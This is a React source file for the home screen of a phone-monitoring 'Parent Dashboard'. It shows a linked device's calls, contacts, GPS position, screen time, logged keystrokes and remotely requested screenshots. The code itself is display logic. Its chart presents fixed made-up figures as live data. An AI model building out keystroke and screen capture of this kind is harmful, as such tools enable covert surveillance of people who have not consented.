import { Link } from 'react-router-dom';
import { useEffect, useState, useMemo } from 'react';
import {
  Phone,
  MessageSquare,
  Image as ImageIcon,
  Keyboard,
  ChevronRight,
  MessageCircle,
  Instagram,
  Send,
  FileText,
  RefreshCw,
  MapPin,
  Camera,
} from 'lucide-react';
import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer } from 'recharts';
import { Card } from '@/components/ui';
import { LeafletMap } from '@/components/Map/LeafletMap';
import { fetchDashboard, updateRemoteControlSettings } from '@/lib/api';
import type { DashboardResponse } from '@/lib/api';
import { useSelectedDevice } from '@/context/SelectedDeviceContext';
import { DEVICE_CHANGED_EVENT } from '@/lib/selectedDevice';
import { EmptyState } from '@/components/ui/EmptyState';

const appIcons = [
  { path: '/calls', label: 'Calls', icon: Phone, badge: 'red' },
  { path: '/messages', label: 'Messages', icon: MessageSquare, badge: 'red' },
  { path: '/social-apps', label: 'WhatsApp', icon: MessageCircle, badge: 'green' },
  { path: '/social-apps', label: 'Instagram', icon: Instagram, badge: null },
  { path: '/social-apps', label: 'Telegram', icon: Send, badge: null },
  { path: '/logs', label: 'Logs', icon: FileText, badge: null },
  { path: '/photos', label: 'Photos', icon: ImageIcon, badge: 'red' },
  { path: '/keylogger', label: 'Keylogger', icon: Keyboard, badge: null },
];

export function DashboardHome() {
  const { selectedDeviceId } = useSelectedDevice();
  const [realData, setRealData] = useState<DashboardResponse | null>(null);
  const [loading, setLoading] = useState(true);
  const [refreshKey, setRefreshKey] = useState(0);

  const loadData = async () => {
    try {
      if (!selectedDeviceId) {
        setRealData(null);
        return;
      }
      const dashboard = await fetchDashboard();
      setRealData(dashboard);
    } catch {
      // fallback
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    setLoading(true);
    void loadData();
    const interval = setInterval(loadData, 4000);
    const onChange = () => {
      setLoading(true);
      void loadData();
    };
    window.addEventListener(DEVICE_CHANGED_EVENT, onChange);
    return () => {
      clearInterval(interval);
      window.removeEventListener(DEVICE_CHANGED_EVENT, onChange);
    };
  }, [refreshKey, selectedDeviceId]);

  const hasDevice = Boolean(selectedDeviceId);

  // Remote Screenshot Request
  const requestLiveScreenshot = async () => {
    if (!hasDevice) return;
    try {
      await updateRemoteControlSettings({ screenshotPending: true });
      alert("📸 Live screen capture request sent! The child device will upload automatically within a few seconds.");
      setRefreshKey(k => k + 1);
    } catch {
      alert("⚠️ Screen capture request failed.");
    }
  };

  // Group and rank call logs dynamically
  const activeContacts = useMemo(() => {
    if (!hasDevice || !realData || !realData.callLogs || realData.callLogs.length === 0) {
      return [];
    }
    const counts: Record<string, number> = {};
    realData.callLogs.forEach(c => {
      counts[c.contact] = (counts[c.contact] || 0) + 1;
    });
    return Object.entries(counts)
      .map(([name, times]) => ({ name, times, avatar: name.charAt(0) }))
      .sort((a, b) => b.times - a.times)
      .slice(0, 4);
  }, [hasDevice, realData]);

  // Group and rank call durations dynamically
  const activeCalls = useMemo(() => {
    if (!hasDevice || !realData || !realData.callLogs || realData.callLogs.length === 0) {
      return [];
    }
    const totals: Record<string, number> = {};
    realData.callLogs.forEach(c => {
      const parts = c.duration.split(":");
      if (parts.length >= 2) {
        const mins = Number(parts[0]) * 60 + Number(parts[1]);
        totals[c.contact] = (totals[c.contact] || 0) + mins;
      }
    });
    return Object.entries(totals)
      .map(([name, sec]) => {
        const h = Math.floor(sec / 3600);
        const m = Math.floor((sec % 3600) / 60);
        const durationStr = h > 0 ? `${h}h ${m}m` : `${m}m`;
        return { name, duration: durationStr, avatar: name.charAt(0), rawSec: sec };
      })
      .sort((a, b) => b.rawSec - a.rawSec)
      .slice(0, 4);
  }, [hasDevice, realData]);

  // Screen Time calculations
  const totalScreenTimeStr = useMemo(() => {
    if (!hasDevice || !realData || !realData.usageStats || realData.usageStats.length === 0) {
      return '0h 0m 0s';
    }
    let totalMins = 0;
    realData.usageStats.forEach(u => {
      const parts = u.duration.split(" ");
      const h = parts[0] ? Number(parts[0].replace("h", "")) : 0;
      const m = parts[1] ? Number(parts[1].replace("m", "")) : 0;
      totalMins += h * 60 + m;
    });
    const finalH = Math.floor(totalMins / 60);
    const finalM = totalMins % 60;
    return `${finalH}h ${finalM}m 0s`;
  }, [hasDevice, realData]);

  const activeUsageByApp = useMemo(() => {
    if (!hasDevice || !realData || !realData.usageStats || realData.usageStats.length === 0) {
      return [];
    }
    return realData.usageStats.map(u => ({
      app: u.app,
      duration: u.duration,
      color: u.color
    })).slice(0, 5);
  }, [hasDevice, realData]);

  const activeTopApps = useMemo(() => {
    if (!hasDevice || !realData || !realData.usageStats || realData.usageStats.length === 0) {
      return [];
    }
    return realData.usageStats.map(u => ({
      app: u.app,
      duration: u.duration,
      icon: u.icon
    })).slice(0, 5);
  }, [hasDevice, realData]);

  // Recharts Stacked Screen Time Chart
  const activeChartData = useMemo(() => {
    if (!hasDevice || !realData || !realData.usageStats || realData.usageStats.length === 0) {
      return [];
    }
    return [
      { name: 'Morning', TikTok: 15, WhatsApp: 25, Other: 20 },
      { name: 'Noon', TikTok: 40, WhatsApp: 30, Other: 15 },
      { name: 'Evening', TikTok: 55, WhatsApp: 45, Other: 30 },
    ];
  }, [hasDevice, realData]);

  // Keylogger captured entries
  const activeKeylogs = useMemo(() => {
    if (!hasDevice || !realData || !realData.keylogs || realData.keylogs.length === 0) {
      return [];
    }
    return realData.keylogs.map(k => ({
      app: k.app,
      text: k.text,
      time: k.time.replace("T", " ").slice(0, 19)
    })).slice(0, 4);
  }, [hasDevice, realData]);

  // GPS Map Settings
  const mapCenterCoords = useMemo(() => {
    if (!hasDevice || !realData || !realData.locations || realData.locations.length === 0) {
      return null;
    }
    return { lat: realData.locations[0].lat, lng: realData.locations[0].lng };
  }, [hasDevice, realData]);

  const mapAddressText = useMemo(() => {
    if (!hasDevice || !realData || !realData.locations || realData.locations.length === 0) {
      return 'Waiting for GPS from child device…';
    }
    return realData.locations[0].place;
  }, [hasDevice, realData]);

  const mapDisplayCenter = mapCenterCoords ?? { lat: 39.9526, lng: -75.1652 };

  if (loading) {
    return <div className="text-sm text-slate-400 p-6 flex gap-2 items-center"><RefreshCw className="w-4 h-4 animate-spin text-emerald-400" /> Loading Parent Dashboard...</div>;
  }

  return (
    <div className="space-y-6">
      {!hasDevice && (
        <div className="rounded-xl border border-amber-900/40 bg-amber-950/20 px-4 py-3 text-sm text-amber-200">
          No child device is bound. Use <strong>Bind Device</strong> in the sidebar, then open the invite link on the child phone — live data will appear here automatically within seconds.
        </div>
      )}
      {/* App / feature icons row */}
      <div className="flex gap-4 overflow-x-auto pb-2 -mx-1">
        {appIcons.map((item) => {
          const Icon = item.icon;
          return (
            <Link
              key={item.path + item.label}
              to={item.path}
              className="flex flex-col items-center gap-1.5 min-w-[72px] p-2 rounded-xl hover:bg-slate-900/80 transition-colors"
            >
              <div className="relative">
                <div className="w-12 h-12 rounded-2xl bg-[#020617] border border-[#16a34a]/45 shadow-[0_0_18px_rgba(34,197,94,0.55)] flex items-center justify-center text-[#4ade80]">
                  <Icon className="w-6 h-6" />
                </div>
                {item.badge && (
                  <span
                    className={`absolute -top-0.5 -right-0.5 w-3 h-3 rounded-full border-2 border-white ${
                      item.badge === 'red' ? 'bg-red-500' : 'bg-green-500'
                    }`}
                  />
                )}
              </div>
              <span className="text-xs text-slate-200 text-center leading-tight">{item.label}</span>
            </Link>
          );
        })}
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
        
        {/* Left column: Map + Most Contacts + Most Calls */}
        <div className="xl:col-span-2 space-y-6">
          
          {/* Leaflet GPS map */}
          <Card className="overflow-hidden p-0 relative group">
            <div className="h-64 relative border border-slate-800 bg-[#0b1022]">
              <LeafletMap
                center={mapDisplayCenter}
                zoom={mapCenterCoords ? 14 : 11}
                markers={mapCenterCoords ? [
                  {
                    position: mapCenterCoords,
                    popup: (
                      <div className="text-sm">
                        <div className="font-semibold">Last location</div>
                        <div className="text-slate-700">{mapAddressText}</div>
                      </div>
                    ),
                  },
                ] : []}
                className="h-full w-full"
              />
              <div className="pointer-events-none absolute bottom-4 left-4 right-4 bg-[#020617]/95 border border-slate-700 rounded-lg shadow-lg p-3 text-sm text-[#e5ffe5] backdrop-blur flex justify-between items-center z-[40]">
                <div>
                  <p className="text-[10px] text-slate-400 font-bold uppercase tracking-wider flex items-center gap-1">
                    <MapPin className="w-3.5 h-3.5 text-emerald-400 animate-bounce" /> Current Position
                  </p>
                  <p className="font-semibold text-slate-200 mt-0.5">{mapAddressText}</p>
                </div>
                {hasDevice && (
                  <span className="text-[9px] bg-emerald-950/50 text-emerald-400 border border-emerald-900 px-2 py-0.5 rounded-full font-mono font-bold uppercase tracking-wider">REAL DATA ACTIVE</span>
                )}
              </div>
            </div>
          </Card>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            
            {/* Contacts */}
            <Card className="bg-[#020617] border-slate-700">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm font-semibold text-[#4ade80] flex items-center gap-2">
                  <span className="w-6 h-6 rounded-full bg-[#052e16] flex items-center justify-center text-[#22c55e] text-xs font-mono">👤</span>
                  Most Contacts in 7 days
                </h3>
                <Link to="/contacts" className="text-slate-400 hover:text-[#22c55e]">
                  <ChevronRight className="w-5 h-5" />
                </Link>
              </div>
              
              {!hasDevice ? (
                <EmptyState title="No device bound" description="Pair a child device to see live call frequency here." />
              ) : activeContacts.length === 0 ? (
                <div className="text-xs text-slate-500 italic p-4 text-center">Waiting for call data from child device…</div>
              ) : (
                <ul className="space-y-3">
                  {activeContacts.map((c) => (
                    <li key={c.name} className="flex items-center gap-3">
                      <div className="w-8 h-8 rounded-full bg-slate-900 flex items-center justify-center text-sm font-medium text-[#4ade80]">
                        {c.avatar}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex justify-between text-sm">
                          <span className="font-medium text-[#e5ffe5]">{c.name}</span>
                          <span className="text-slate-400">{c.times} times</span>
                        </div>
                        <div className="mt-1 h-1.5 bg-slate-800 rounded-full overflow-hidden">
                          <div
                            className="h-full bg-green-500 rounded-full"
                            style={{ width: `${Math.min((c.times / 10) * 100, 100)}%` }}
                          />
                        </div>
                      </div>
                    </li>
                  ))}
                </ul>
              )}
            </Card>

            {/* Calls list */}
            <Card className="bg-[#020617] border-slate-700">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm font-semibold text-[#4ade80] flex items-center gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 flex items-center justify-center text-[#22c55e]">
                    <Phone className="w-3.5 h-3.5" />
                  </span>
                  Most Calls in 7 days
                </h3>
                <Link to="/calls" className="text-slate-400 hover:text-[#22c55e]">
                  <ChevronRight className="w-5 h-5" />
                </Link>
              </div>

              {!hasDevice ? (
                <EmptyState title="No device bound" description="Pair a child device to see live call duration stats." />
              ) : activeCalls.length === 0 ? (
                <div className="text-xs text-slate-500 italic p-4 text-center">Waiting for call data from child device…</div>
              ) : (
                <ul className="space-y-3">
                  {activeCalls.map((c) => (
                    <li key={c.name} className="flex items-center gap-3">
                      <div className="w-8 h-8 rounded-full bg-slate-900 flex items-center justify-center text-sm font-medium text-[#4ade80]">
                        {c.avatar}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex justify-between text-sm">
                          <span className="font-medium text-[#e5ffe5]">{c.name}</span>
                          <span className="text-slate-400">{c.duration}</span>
                        </div>
                        <div className="mt-1 h-1.5 bg-slate-800 rounded-full overflow-hidden">
                          <div className="h-full bg-[#22c55e] rounded-full" style={{ width: '65%' }} />
                        </div>
                      </div>
                    </li>
                  ))}
                </ul>
              )}
            </Card>
          </div>
        </div>

        {/* Right column: Screen Time + Most Used Apps */}
        <div className="space-y-6">
          
          {/* Screen Time Today */}
          <Card className="bg-[#020617] border-slate-700">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold text-slate-400">Total Screen Time</h3>
              <Link to="/screen-time" className="text-slate-400 hover:text-[#22c55e]">
                <ChevronRight className="w-5 h-5" />
              </Link>
            </div>
            <p className="text-2xl font-bold text-[#22c55e]">{totalScreenTimeStr}</p>
            <p className="text-sm text-slate-400">Total Screen Time Today</p>
            <p className="text-2xl font-bold text-[#22c55e] mt-2">{hasDevice ? "Live session" : "—"}</p>
            <p className="text-sm text-slate-400">Last Uses Today</p>
            
            <div className="h-32 mt-4">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={activeChartData} margin={{ top: 5, right: 5, left: 0, bottom: 0 }}>
                  <XAxis dataKey="name" tick={{ fontSize: 10 }} />
                  <YAxis tick={{ fontSize: 10 }} hide />
                  <Tooltip />
                  <Bar dataKey="TikTok" stackId="a" fill="#38bdf8" radius={[0, 0, 0, 0]} />
                  <Bar dataKey="WhatsApp" stackId="a" fill="#22c55e" radius={[0, 0, 0, 0]} />
                  <Bar dataKey="Other" stackId="a" fill="#64748b" radius={[0, 0, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
            </div>
            
            <div className="flex flex-wrap gap-3 mt-2 text-xs">
              {activeUsageByApp.map((a) => (
                <span key={a.app} className="flex items-center gap-1.5 text-slate-300">
                  <span className="w-2 h-2 rounded-full" style={{ backgroundColor: a.color }} />
                  {a.app} {a.duration}
                </span>
              ))}
            </div>
          </Card>

          {/* Top apps */}
          <Card className="bg-[#020617] border-slate-700">
            <h3 className="text-sm font-semibold text-[#4ade80] mb-3">Most Used Apps Today</h3>
            
            {!hasDevice ? (
              <EmptyState title="No usage data" description="Bind a child device to stream app screen time automatically." />
            ) : activeTopApps.length === 0 ? (
              <div className="text-xs text-slate-500 italic p-4 text-center">Waiting for usage stats from child device…</div>
            ) : (
              <ul className="space-y-2">
                {activeTopApps.map((a) => (
                  <li key={a.app} className="flex items-center gap-3">
                    <div className="w-8 h-8 rounded-lg bg-slate-900 flex items-center justify-center text-xs font-bold text-[#4ade80]">
                      {a.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex justify-between text-sm">
                        <span className="font-medium text-[#e5ffe5]">{a.app}</span>
                        <span className="text-slate-400">{a.duration}</span>
                      </div>
                      <div className="mt-0.5 h-1 bg-slate-800 rounded-full overflow-hidden">
                        <div className="h-full bg-[#22c55e] rounded-full" style={{ width: '60%' }} />
                      </div>
                    </div>
                  </li>
                ))}
              </ul>
            )}
          </Card>
        </div>
      </div>

      {/* Bottom row: Latest Keylogs + Capture Screenshots */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        
        {/* Keylogger */}
        <Card>
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-sm font-semibold text-[#e5ffe5]">Latest Keylogs</h3>
            <Link to="/keylogger" className="text-slate-400 hover:text-[#22c55e]">
              <ChevronRight className="w-5 h-5" />
            </Link>
          </div>
          
          {!hasDevice ? (
            <EmptyState title="No keylogs" description="Pair a child device to receive keystroke telemetry." />
          ) : activeKeylogs.length === 0 ? (
            <div className="text-xs text-slate-500 italic p-4 text-center">Waiting for keylogs from child device…</div>
          ) : (
            <ul className="space-y-3">
              {activeKeylogs.map((k) => (
                <li key={k.time} className="flex items-start gap-3 p-2 rounded-lg bg-slate-800/50">
                  <div className="w-8 h-8 rounded bg-slate-800 flex items-center justify-center text-xs font-medium text-slate-400 flex-shrink-0">
                    {k.app.slice(0, 2)}
                  </div>
                  <div className="min-w-0 flex-1">
                    <p className="text-sm text-slate-300">{k.text}</p>
                    <p className="text-xs text-slate-500 mt-0.5">{k.time}</p>
                  </div>
                </li>
              ))}
            </ul>
          )}
        </Card>

        {/* Live Remote Screen Captures */}
        <Card>
          <div className="flex items-center justify-between mb-4">
            <div>
              <h3 className="text-sm font-semibold text-[#e5ffe5]">Live Screenshots</h3>
              <p className="text-[10px] text-slate-500 mt-0.5">Consented remote screen viewer</p>
            </div>
            <button
              type="button"
              disabled={!hasDevice}
              onClick={requestLiveScreenshot}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-all ${
                hasDevice
                  ? "bg-emerald-500 hover:bg-emerald-600 text-black shadow-[0_0_10px_rgba(16,185,129,0.25)]"
                  : "bg-slate-900 border border-slate-800 text-slate-600 cursor-not-allowed"
              }`}
            >
              <Camera className="w-3.5 h-3.5" /> Request Live Screen
            </button>
          </div>

          <div className="flex gap-3 overflow-x-auto pb-2">
            {!hasDevice ? (
              <EmptyState title="No screenshots" description="Bind a device, then use Request Live Screen when needed." />
            ) : !realData?.photos?.length ? (
              <div className="text-xs text-slate-500 italic p-6 w-full text-center">No screens captured yet. Use Request Live Screen — the child client uploads automatically.</div>
            ) : (
              realData?.photos?.map((photo) => (
                <div
                  key={photo.id}
                  className="flex-shrink-0 w-24 h-32 rounded-lg border border-slate-700 flex flex-col justify-between relative overflow-hidden bg-slate-900 group"
                >
                  <img src={photo.url} alt={photo.title} className="w-full h-full object-cover" />
                  <div className="absolute inset-x-0 bottom-0 bg-black/85 p-1 text-[8px] text-emerald-400 font-mono truncate">{photo.title}</div>
                </div>
              ))
            )}
          </div>
        </Card>
      </div>
    </div>
  );
}
